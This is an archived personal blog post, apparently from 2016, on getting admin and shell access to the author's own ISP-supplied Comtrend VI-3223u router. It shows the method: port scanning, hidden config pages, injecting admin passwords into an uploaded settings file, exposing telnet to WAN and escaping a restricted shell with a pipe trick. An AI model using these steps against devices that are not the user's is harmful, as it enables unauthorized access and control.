@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Getting admin access for Comtrend VI-3223u router // Marat Sharifullin</title>
+
+        <meta charset="utf-8">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <meta name="author" content="">
+        <meta property="og:title" content="Getting admin access for Comtrend VI-3223u router" />
+    <meta property="og:description" content="" />
+    <meta property="og:type" content="website" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:url" content="https://ifnull.org/articles/router_full_access/" />
+    
+
+    <link href="" rel="alternate" type="application/rss+xml" title="Marat Sharifullin" />
+    <link rel="shortcut icon" href="/favicon.ico">
+
+    <link href="https://ifnull.org/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+    <link href="https://ifnull.org/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+    
+    <link rel="stylesheet" href="https://ifnull.org/css/style.css">
+
+    <link href="http://gmpg.org/xfn/11" rel="profile">
+
+    
+
+    <meta name="generator" content="Hugo 0.91.0" />
+</head>
+
+
+<body>
+<div id="container">
+    
+<div class="banner" style="padding:15px; text-align:center; background-color:#bb3434">
+    <div class="banner-content">
+        This is a copy or a backup of <a href="https://ifnull.org" class="btn btn-primary">ifnull.org</a>.
+    </div>
+</div>
+
+
+<header id="header">
+    <div id="header-outer" class="outer">
+        <div id="header-inner" class="inner">
+            <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+            <a id="logo" class="logo-text" href="https://ifnull.org/">Marat Sharifullin</a>
+            <nav id="main-nav">
+                
+                <a class="main-nav-link" href="/">Blog</a>
+                
+                <a class="main-nav-link" href="/projects/all/">Projects</a>
+                
+                <a class="main-nav-link" href="/archive/">Archive</a>
+                
+                <a class="main-nav-link" href="/mabsurdation/">Mabsurdation</a>
+                
+                <a class="main-nav-link" href="/gallery/public/">Gallery</a>
+                
+                <a class="main-nav-link" href="/contact/">Contact</a>
+                
+            </nav>
+            <nav id="sub-nav">
+                <div id="search-form-wrap">
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+
+    <section id="main" class="outer">
+        <article class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        <header class="article-header">
+            <h1 class="article-title" itemprop="name">Getting admin access for Comtrend VI-3223u router</h1>
+        </header>
+        
+        <div class="article-meta">
+	    
+                <a href="/articles/router_full_access/" class="article-date">
+                    <time datetime='2016-03-02T00:00:00.000&#43;00:00' itemprop="datePublished">2016-03-02</time>
+                </a>
+	    
+            
+            
+	    
+            <div class="article-comment-link-wrap">
+                <a href="/articles/router_full_access/#disqus_thread" class="article-comment-link">Comments</a>
+            </div>
+            
+        </div>
+        <div class="article-entry" itemprop="articleBody">
+            <p>I have got <strong>Comtrend VI-3223u</strong> router from my ISP. Unfortunaly they do not give you full access to this router.
+Recently I have discovered that with limited access you cannot do even simple things like configuring static IP address
+in DHCP or setting up parental control. If you are interested how to get full access for this router then this article is for you.</p>
+<p>Before we start I assume that you have access to your router via http (the most common location is <strong>http://192.168.1.1</strong>)
+and you can login with user with limited rights. Let&rsquo;s assume that login name is &ldquo;<strong>user</strong>&rdquo; (it is in my case).</p>
+<h3 id="investigating-open-ports">Investigating open ports</h3>
+<p>If you login with <strong>user</strong> via http then you can find that there is limit set of settings you can change.
+Let&rsquo;s check other means to access the router:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap 192.168.1.1
+Starting Nmap 5.51 <span style="color:#f92672">(</span> http://nmap.org <span style="color:#f92672">)</span> at 2016-03-02 22:40 CET
+Nmap scan report <span style="color:#66d9ef">for</span> Comtrend.
+Home <span style="color:#f92672">(</span>192.168.1.1<span style="color:#f92672">)</span> Host is up <span style="color:#f92672">(</span>0.0037s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">993</span> closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+5431/tcp open  park-agent
+</code></pre></div><p>As you can see the router has a few interesting ports to check: ftp, ssh, telnet.
+Unfortunately I could not get anything useful neither from telnet nor ssh:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ telnet 192.168.1.1
+Trying 192.168.1.1...
+Connected to comtrend.home.
+Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
+Connection closed by foreign host.
+
+$ ssh user@192.168.1.1
+ssh_exchange_identification: read: Connection reset by peer
+</code></pre></div><p>I have not tried ftp. Maybe it has some holes?</p>
+<h3 id="looking-for-hidden-html-content">Looking for hidden html content</h3>
+<p>Before I started to fiddle around with router I checked the Internet if there were any available exploits for this router.
+I could not find anything. The only thing I found was some hidden html pages.
+Hidden in the sense that there are no direct links to them from router web pages. These pages proved to be useful.</p>
+<p><strong>http://192.168.1.1/password.html</strong> allows to change user&rsquo;s password. Unfortunately only if you know the current password.
+But it gave insights into different accounts on the router:</p>
+<pre tabindex="0"><code>Access Control -- Passwords
+Access to your broadband router is controlled through three user accounts: ADMIN_ACCOUNT_1, ADMIN_ACCOUNT_2, and user.
+The user name &quot;ADMIN_ACCOUNT_1&quot; has unrestricted access to change and view configuration of your Broadband Router.
+The user name &quot;ADMIN_ACCOUNT_2&quot; is used to allow an ISP technician to access your Broadband Router for maintenance and to run diagnostics.
+The user name &quot;user&quot; can access the Broadband Router, view configuration settings and statistics, as well as, update the router's software. 
+</code></pre><p>Ok, so now we know that there are two more accounts (<strong>admin</strong> and <strong>support</strong>) with higher access rights than <strong>user</strong>.
+I tried many stanadard passwords like (admin, 12345, root) but it did not work.</p>
+<p>The next interesting hidden html page is <strong>http://192.168.1.1/backupsettings.conf</strong> It collects all router settings
+(even those that you cannot see or modify using <strong>user</strong> account) and gives it to you as an xml file.
+It contains all information to setup internet connection. You can use them to setup own router
+instead of <strong>Comtrend VI-3223u</strong> provided by ISP. I almost decided to go this way.
+But then I noticed that this config file contains my <strong>user</strong> password (base64 encoded) to access the router:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;X_BROADCOM_COM_LoginCfg&gt;</span>
+  <span style="color:#f92672">&lt;UserPassword&gt;</span>c29tZXBhc3N3b3JkaGVyZQo=<span style="color:#f92672">&lt;/UserPassword&gt;</span>
+<span style="color:#f92672">&lt;/X_BROADCOM_COM_LoginCfg&gt;</span> 
+</code></pre></div><p>It would have been convinient if it had AdminPassword and SupportPassword as well.
+What would happen if I add admin and support passwords to this config file and upload it back to the router.
+Luckily there is another hidden webage to upload config file to router <strong>http://192.168.1.1/updatesettings.html</strong>.
+Let&rsquo;s modify config file and try to update router settings:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;X_BROADCOM_COM_LoginCfg&gt;</span>
+  <span style="color:#f92672">&lt;AdminPassword&gt;</span>c29tZXBhc3N3b3JkaGVyZQo=<span style="color:#f92672">&lt;/AdminPassword&gt;</span>
+  <span style="color:#f92672">&lt;SupportPassword&gt;</span>c29tZXBhc3N3b3JkaGVyZQo=<span style="color:#f92672">&lt;/SupportPassword&gt;</span>
+  <span style="color:#f92672">&lt;UserPassword&gt;</span>c29tZXBhc3N3b3JkaGVyZQo=<span style="color:#f92672">&lt;/UserPassword&gt;</span>
+<span style="color:#f92672">&lt;/X_BROADCOM_COM_LoginCfg&gt;</span>
+</code></pre></div><blockquote>
+<p><strong>hybrid-cloudblog</strong> pointed that it did not work with new firmware.
+The following workaround might help:
+<code>&lt;AdminPassword notification=&quot;2&quot;&gt;c29tZXBhc3N3b3JkaGVyZQo=&lt;/AdminPassword&gt;</code>
+as he describes it <a href="http://www.hybrid-cloudblog.com/get-admin-acces-tele2-3223u-adsl-modem/">here</a>.</p>
+</blockquote>
+<p>For simplicity I used the same password as <strong>user</strong>&rsquo;s password for <strong>admin</strong> and <strong>support</strong> accounts.
+Go to <strong>http://192.168.1.1/updatesettings.html</strong> and update router setting using modified config file.
+Wait for it to come back.</p>
+<p>Once the router comes back try login with <strong>ADMIN_ACCOUNT_1</strong>(you get admin account name from <strong>http://192.168.1.1/password.html</strong>)
+user name and user&rsquo;s password. <strong>WOW, it works!</strong> I have got full right access to my router.
+Finally I could setup static DHCP addresses and parental control.</p>
+<p>But can we go further? Who would not like shell access to his router?</p>
+<h3 id="getting-shell-access">Getting shell access</h3>
+<p>Using your admin account in the web client of the router navigate to <strong>Management &gt; Access Control &gt; Services</strong>.
+Put ssh and telnet into <strong>LAN+WAN</strong> access mode. Save settings and let&rsquo;s try telnet again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ telnet 192.168.1.1
+Trying 192.168.1.1...
+
+Connected to comtrend.home.
+Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
+Broadband Router
+Login: ADMIN_ACCOUNT_1
+Password: &lt;known users password here&gt;
+&gt; help
+?
+help
+reboot
+psp
+ps
+dns
+cat
+... many more other commands 
+</code></pre></div><p>Wow, now telnet works. But unfortunately it does not have useful commands like <strong>ls</strong>, only <strong>cat</strong>.
+But even using <strong>cat</strong> we can get some interesting info:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt; cat /etc/passwd
+ADMIN_ACCOUNT_1:hashed_password:0:0:Administrator:/:/bin/sh
+ADMIN_ACCOUNT_2:hashed_password:0:0:Technical Support:/:/bin/sh
+user:hashed_password:0:0:Normal User:/:/bin/sh
+nobody:hashed_password:0:0:nobody <span style="color:#66d9ef">for</span> ftp:/:/bin/sh
+</code></pre></div><p>This is not really useful since we already know the admin&rsquo;s password and even know how to change it.
+Let&rsquo;s see if we can execute something outside of provided commands by telnet. Check if semicolon can help us:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt; echo ; ls
+Warning: operator ; is not supported!
+</code></pre></div><p>Bummer&hellip; But what about pipe?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt; echo | ls
+bin dev lib mnt proc sys usr webs
+data etc linuxrc opt sbin tmp var
+</code></pre></div><p><strong>It works!</strong> You can run any availalbe shell command (ls, cp, rm, mkdir,&hellip; check bin directory to see more) using &ldquo;pipe&rdquo; trick.
+Now you are only limited by your imagination. To make your investigations easier you can connect usb driveto the router
+and cp everything to this drive: <code>echo | ls cp bin etc lib /mnt/usb1_1/</code>.</p>
+        </div>
+
+        
+        
+        <div class="article-toc" >
+            <h3></h3>
+            <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#investigating-open-ports">Investigating open ports</a></li>
+        <li><a href="#looking-for-hidden-html-content">Looking for hidden html content</a></li>
+        <li><a href="#getting-shell-access">Getting shell access</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+        
+        
+
+        
+
+
+        
+    </div>
+</article>
+
+        
+            
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'ifnull';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+        
+    </section>
+    <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2022 Marat Sharifullin&nbsp;
+            Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with theme <a href="https://github.com/carsonip/hugo-theme-minos">Minos</a>
+        </div>
+    </div>
+    
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/tomorrow-night.min.css" integrity="sha256-2wL88NKUqvJi/ExflDzkzUumjUM73mcK2gBvBBeLvTk=" crossorigin="anonymous" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    <script>
+        document.getElementById('main-nav-toggle').addEventListener('click', function () {
+            var header = document.getElementById('header');
+            if (header.classList.contains('mobile-on')) {
+                header.classList.remove('mobile-on');
+            } else {
+                header.classList.add('mobile-on');
+            }
+        });
+    </script>
+</footer>
+</div>
+</body>
+</html>
